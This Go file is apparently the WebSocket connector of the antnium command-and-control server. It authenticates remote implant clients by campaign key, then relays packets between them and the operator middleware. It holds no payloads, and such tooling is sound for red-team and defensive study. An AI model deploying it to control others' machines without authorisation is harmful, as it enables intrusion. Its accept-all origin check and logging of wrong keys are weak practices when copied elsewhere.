package server

import (
	"encoding/json"
	"net/http"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"
	"github.com/gorilla/websocket"
	log "github.com/sirupsen/logrus"
)

type ConnectorWs struct {
	middleware *Middleware
	clients    map[string]*websocket.Conn // ComputerId:WebsocketConnection
	wsUpgrader websocket.Upgrader
	coder      model.Coder
	campaign   *campaign.Campaign
}

func MakeConnectorWs(campaign *campaign.Campaign, middleware *Middleware) ConnectorWs {
	a := ConnectorWs{
		middleware: middleware,
		clients:    make(map[string]*websocket.Conn),
		wsUpgrader: websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }},
		coder:      model.MakeCoder(campaign),
		campaign:   campaign,
	}
	return a
}

func (co *ConnectorWs) Shutdown() {
	for _, conn := range co.clients {
		if conn != nil {
			conn.Close()
		}
	}
}

// wsHandlerClient is the entry point for new client initiated websocket connections
func (co *ConnectorWs) wsHandlerClient(w http.ResponseWriter, r *http.Request) {
	ws, err := co.wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Errorf("ClientWebsocket: Could not upgrade http socket: %s", err.Error())
		return
	}

	// WebSocket Authentication
	var authToken model.ClientWebSocketAuth
	_, message, err := ws.ReadMessage()
	if err != nil {
		log.Errorf("ClientWebsocket: read initial websocket authentication error: %s", err.Error())
		return
	}
	err = json.Unmarshal(message, &authToken)
	if err != nil {
		log.Errorf("ClientWebsocket: could not decode websocket authentication: %v", message)
		return
	}
	if authToken.Key != co.campaign.ApiKey {
		log.Warn("ClientWebsocket: incorrect key for client websocket authentication: " + authToken.Key)
		return
	}
	// register client as auth succeeded
	co.clients[authToken.ComputerId] = ws

	co.handleWs(authToken.ComputerId, ws)
}

func (co *ConnectorWs) handleWs(computerId string, ws *websocket.Conn) {
	if ws == nil {
		log.Error("ClientWebsocket: handleWs(): invalid websocket connection")
		return
	}

	// Thread which reads from the client connection
	// Lifetime: Websocket connection
	go func() {
		for {
			_, packetData, err := ws.ReadMessage()
			if err != nil {
				// Websocket closed, clean it up
				ws.Close()
				co.clients[computerId] = nil
				break
			}
			packet, err := co.coder.DecodeData(packetData)
			if err != nil {
				log.Infof("ClientWebsocket: could not handle incoming websocket data (ignore): %s", err.Error())
				continue
			}
			co.middleware.ClientSendPacket(packet, ws.RemoteAddr().String(), "ws")
		}
	}()

	// send all packets which havent yet been answered
	// make sure its a copy, and only iterate once.
	// If server is not available (WS disconnected), the packet response is lost.

	// make it a thread, so we return and all the stuff works
	//go func() {
	packets := make([]model.Packet, 0)
	for {
		packet, ok := co.middleware.ClientGetPacket(computerId, ws.RemoteAddr().String(), "ws")
		if !ok {
			break
		}
		packets = append(packets, packet)
	}
	for _, packet := range packets {
		ok := co.TryViaWebsocket(&packet)
		if !ok {
			log.Errorf("ClientWebsocket: Sending of initial packets via websocket failed")
		}
	}
	//}()

}

func (co *ConnectorWs) TryViaWebsocket(packet *model.Packet) bool {
	clientConn, ok := co.clients[packet.ComputerId]
	if !ok {
		// All ok, not connected to ws
		return false
	}
	if clientConn == nil {
		log.Warn("ClientWebsocket: TryViaWebSocket(): clientConn nil")
		return false
	}

	// Encode the packet and send it
	jsonData, err := co.coder.EncodeData(*packet)
	if err != nil {
		return false
	}

	err = clientConn.WriteMessage(websocket.TextMessage, jsonData)
	if err != nil {
		log.Infof("ClientWebsocket: Websocket for host %s closed when trying to write: %s", packet.ComputerId, err.Error())
		return false
	}

	log.Debugf("ClientWebsocket: Sent packet %s to client %s via WS", packet.PacketId, packet.ComputerId)

	return true
}
